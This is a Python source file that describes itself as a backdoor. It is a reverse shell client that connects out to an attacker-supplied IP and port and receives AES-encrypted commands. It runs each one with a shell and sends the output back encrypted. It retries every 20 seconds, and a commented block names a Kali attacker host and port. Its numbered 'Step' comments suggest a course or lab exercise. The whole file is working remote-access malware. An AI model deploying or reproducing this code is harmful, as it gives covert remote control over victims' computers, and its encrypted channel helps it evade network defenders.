#!/bin/python

import socket
import json
import time
import subprocess
import os
import argparse
import base64

from Crypto.Cipher import AES

# Step 3: Configuration
parser = argparse.ArgumentParser(description='Backdoor script to connect to given IP and port.')
parser.add_argument('ip', help='IP address to connect to')
parser.add_argument('port', type=int, help='Port number to connect to')

args = parser.parse_args()

SERVER_IP = args.ip
SERVER_PORT = args.port

'''
# Step 1: Use explicit SERVER_IP and SERVER_PORT make create a connection 
SERVER_IP = '192.168.64.8'  # IP of my Kali Linux machine
SERVER_PORT = 8887
'''
#Step 4: Authentication
key = b'\x91)\xdd\xa9\x06\xaa\x8d\xb2\xbd\x7fY\x84! \x99\xcb'


def encrypt(msg):
  cipher = AES.new(key, AES.MODE_EAX)
  nonce = cipher.nonce
  ciphertext, tag = cipher.encrypt_and_digest(msg.encode('ascii'))
  return nonce, ciphertext, tag

def decrypt(nonce, ciphertext, tag):
  cipher = AES.new(key, AES.MODE_EAX, nonce=nonce)
  plaintext = cipher.decrypt(ciphertext)
  try:
    cipher.verify(tag)
    return plaintext.decode('ascii')
  except:
    return False


def send(data):
    nonce, ciphertext, tag = encrypt(data)
    message = {
        'nonce': base64.b64encode(nonce).decode('utf-8'),
        'ciphertext': base64.b64encode(ciphertext).decode('utf-8'),
        'tag': base64.b64encode(tag).decode('utf-8')
    }
    json_data = json.dumps(message)
    client_sock.send(json_data.encode('utf-8'))


def recv_command():
    data = client_sock.recv(4096).decode('utf-8')  # Increased buffer size for safety
    try:
        message = json.loads(data)
        nonce = base64.b64decode(message['nonce'])
        ciphertext = base64.b64decode(message['ciphertext'])
        tag = base64.b64decode(message['tag'])
        decrypted_command = decrypt(nonce, ciphertext, tag)
        if decrypted_command is False:
            print("Decryption failed.")
            return None
        return decrypted_command
    except ValueError:
        return None


def create_connection():
    while True:
        time.sleep(20)
        try:
            client_sock.connect((SERVER_IP, SERVER_PORT))
            work()
            client_sock.close()
            break
        except:
            create_connection()


def work():
    while True:
        command = recv_command()
        if command == 'quit' or command == 'exit':
            break
        elif command == 'clear':
            pass
        elif command[:3] == 'cd ':
            os.chdir(command[3:])
        else:
            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                       stdin=subprocess.PIPE)
            output = execute.stdout.read() + execute.stderr.read()
            output = output.decode()
            send(output)


client_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
create_connection()